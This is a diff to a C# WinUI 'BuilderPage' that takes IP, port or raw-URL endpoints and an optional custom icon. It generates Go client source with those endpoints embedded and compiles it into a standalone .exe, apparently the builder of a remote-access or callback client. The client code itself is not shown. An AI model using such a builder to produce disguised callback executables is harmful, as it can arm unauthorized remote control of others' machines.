@@ -1,7 +1,11 @@
-﻿using Microsoft.UI.Xaml.Controls;
+﻿using KryakApp.Client;
 using Microsoft.UI.Xaml;
+using Microsoft.UI.Xaml.Controls;
 using System;
+using System.Collections.Generic;
 using System.Collections.ObjectModel;
+using System.Diagnostics;
+using System.IO;
 using System.Threading.Tasks;
 using Windows.Storage;
 using Windows.Storage.Pickers;
@@ -11,7 +15,9 @@ namespace KryakApp.Pages
 {
     public sealed partial class BuilderPage : Page
     {
-        private readonly ObservableCollection<string> _connections = [];
+        private readonly ObservableCollection<ConnectionEntry> _connections = [];
+        private readonly List<string> _ipConnections = [];
+        private readonly List<string> _rawConnections = [];
 
         public BuilderPage()
         {
@@ -62,8 +68,9 @@ namespace KryakApp.Pages
         private void AddConnectionButton_Click(object sender, RoutedEventArgs e)
         {
             string? item = null;
+            bool isRaw = RawModeRadio.IsChecked == true;
 
-            if (RawModeRadio.IsChecked == true)
+            if (isRaw)
             {
                 string raw = RawUrlTextBox.Text.Trim();
                 if (string.IsNullOrWhiteSpace(raw))
@@ -88,26 +95,47 @@ namespace KryakApp.Pages
                 PortTextBox.Text = string.Empty;
             }
 
-            foreach (string existing in _connections)
+            foreach (ConnectionEntry existing in _connections)
             {
-                if (string.Equals(existing, item, StringComparison.OrdinalIgnoreCase))
+                if (existing.IsRaw == isRaw &&
+                    string.Equals(existing.Value, item, StringComparison.OrdinalIgnoreCase))
                 {
                     return;
                 }
             }
 
-            _connections.Add(item);
+            _connections.Add(new ConnectionEntry(item, isRaw));
+
+            if (isRaw)
+            {
+                _rawConnections.Add(item);
+            }
+            else
+            {
+                _ipConnections.Add(item);
+            }
+
             UpdateConnectionCount();
         }
 
         private void RemoveConnectionButton_Click(object sender, RoutedEventArgs e)
         {
-            if (sender is not Button button || button.Tag is not string value)
+            if (sender is not Button button || button.Tag is not ConnectionEntry entry)
             {
                 return;
             }
 
-            _connections.Remove(value);
+            _connections.Remove(entry);
+
+            if (entry.IsRaw)
+            {
+                _rawConnections.Remove(entry.Value);
+            }
+            else
+            {
+                _ipConnections.Remove(entry.Value);
+            }
+
             UpdateConnectionCount();
         }
 
@@ -184,7 +212,7 @@ namespace KryakApp.Pages
         {
             ConnectionCountText.Text = _connections.Count == 0
                 ? "No endpoints added"
-                : $"Endpoints: {_connections.Count}";
+                : $"Endpoints: {_connections.Count} (IP: {_ipConnections.Count}, Raw: {_rawConnections.Count})";
         }
 
         private void UpdateTrustButtonState()
@@ -203,7 +231,7 @@ namespace KryakApp.Pages
             }
             catch
             {
-                hasGo = System.IO.File.Exists(System.IO.Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe"));
+                hasGo = File.Exists(Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe"));
             }
             if (hasGo == false)
             {
@@ -249,7 +277,7 @@ namespace KryakApp.Pages
                 _ = dialog.ShowAsync();
                 return;
             }
-            if (CustomIconCheckBox.IsChecked == true && System.IO.File.Exists(IconPathTextBox.Text))
+            if (CustomIconCheckBox.IsChecked == true && !File.Exists(IconPathTextBox.Text))
             {
                 ContentDialog dialog = new()
                 {
@@ -274,20 +302,85 @@ namespace KryakApp.Pages
                 return;
             }
             string goPath;
-            if (System.IO.File.Exists(System.IO.Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe")))
+            if (File.Exists(Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe")))
             {
-                goPath = System.IO.Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe");
+                goPath = Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe");
             }
             else            
             {
                 goPath = "go";
             }
-            
+
+            string[] ipList = _ipConnections.ToArray();
+            string[] rawList = _rawConnections.ToArray();
+
+            if (App.MainWindow is null)
+            {
+                await ShowSimpleDialogAsync("Build Failed", "Main window is unavailable.");
+                return;
+            }
+
+            FileSavePicker savePicker = new();
+            nint hwnd = WindowNative.GetWindowHandle(App.MainWindow);
+            InitializeWithWindow.Initialize(savePicker, hwnd);
+            savePicker.SuggestedStartLocation = PickerLocationId.Downloads;
+            savePicker.FileTypeChoices.Add("Executable file", [".exe"]);
+            savePicker.SuggestedFileName = string.IsNullOrWhiteSpace(FileNameTextBox.Text)
+                ? "client"
+                : Path.GetFileNameWithoutExtension(FileNameTextBox.Text.Trim());
+
+            StorageFile? outputFile = await savePicker.PickSaveFileAsync();
+            if (outputFile is null)
+            {
+                return;
+            }
+
+            string tempBuildDir = Path.Combine(Path.GetTempPath(), "kryakclient-build");
+            Directory.CreateDirectory(tempBuildDir);
+
+            string tempGoPath = Path.Combine(tempBuildDir, "main.go");
+            string tempModPath = Path.Combine(tempBuildDir, "go.mod");
+            string tempSumPath = Path.Combine(tempBuildDir, "go.sum");
+
+            File.WriteAllText(tempGoPath, ClientSourceCode.GetClientCode(ipList, rawList));
+            File.WriteAllText(tempModPath, ClientSourceCode.GetModCode());
+            File.WriteAllText(tempSumPath, ClientSourceCode.GetSumCode());
+
+            ProcessStartInfo startInfo = new()
+            {
+                FileName = goPath,
+                Arguments = $"build -o \"{outputFile.Path}\" \"{tempGoPath}\"",
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                WorkingDirectory = tempBuildDir
+            };
+
+            using Process? process = Process.Start(startInfo);
+            if (process is null)
+            {
+                await ShowSimpleDialogAsync("Build Failed", "Failed to start Go compiler process.");
+                return;
+            }
+
+            string stdOut = await process.StandardOutput.ReadToEndAsync();
+            string stdErr = await process.StandardError.ReadToEndAsync();
+            await process.WaitForExitAsync();
+
+            if (process.ExitCode != 0)
+            {
+                string details = string.IsNullOrWhiteSpace(stdErr) ? stdOut : stdErr;
+                await ShowSimpleDialogAsync("Build Failed", $"go build returned code {process.ExitCode}.\n\n{details}");
+                return;
+            }
+
+            await ShowSimpleDialogAsync("Build Completed", $"Client executable saved to:\n{outputFile.Path}");
         }
 
         private static string GetPackagedLocalPath()
         {
-            return System.IO.Path.Combine(ApplicationData.Current.LocalCacheFolder.Path, "Local", "KryakApp");
+            return Path.Combine(ApplicationData.Current.LocalCacheFolder.Path, "Local", "KryakApp");
         }
 
         private async Task<bool> InstallGoWithProgressAsync()
@@ -325,25 +418,25 @@ namespace KryakApp.Pages
             _ = progressDialog.ShowAsync();
             await Task.Delay(50);
 
-            string tempPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "go1.26.3.windows-amd64.zip");
+            string tempPath = Path.Combine(Path.GetTempPath(), "go1.26.3.windows-amd64.zip");
             string extractPath = GetPackagedLocalPath();
 
             try
             {
                 using System.Net.Http.HttpClient client = new();
                 byte[] data = await client.GetByteArrayAsync("https://go.dev/dl/go1.26.3.windows-amd64.zip");
-                await System.IO.File.WriteAllBytesAsync(tempPath, data);
+                await File.WriteAllBytesAsync(tempPath, data);
 
                 statusText.Text = "Extracting files...";
 
-                if (System.IO.Directory.Exists(extractPath))
+                if (Directory.Exists(extractPath))
                 {
-                    System.IO.Directory.Delete(extractPath, recursive: true);
+                    Directory.Delete(extractPath, recursive: true);
                 }
 
-                System.IO.Directory.CreateDirectory(extractPath);
+                Directory.CreateDirectory(extractPath);
                 System.IO.Compression.ZipFile.ExtractToDirectory(tempPath, extractPath);
-                System.IO.File.Delete(tempPath);
+                File.Delete(tempPath);
                 return true;
             }
             catch
@@ -370,6 +463,19 @@ namespace KryakApp.Pages
             };
 
             await dialog.ShowAsync();
+        }
+
+        private sealed class ConnectionEntry
+        {
+            public ConnectionEntry(string value, bool isRaw)
+            {
+                Value = value;
+                IsRaw = isRaw;
+            }
+
+            public string Value { get; }
+            public bool IsRaw { get; }
+            public string DisplayText => Value;
         }
     }
 }
